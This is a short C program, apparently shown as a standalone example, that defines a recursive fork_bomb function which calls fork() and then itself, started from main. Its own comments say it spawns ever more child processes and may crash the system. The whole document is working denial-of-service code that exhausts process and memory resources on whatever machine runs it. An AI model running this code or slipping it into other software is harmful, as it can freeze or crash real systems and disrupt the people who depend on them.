void fork_bomb() {
    fork();
    fork_bomb();  // Recursive call to create more child processes
}

int main() {
    fork_bomb();
    return 0;  // This line may not be reached due to potential system crash
}
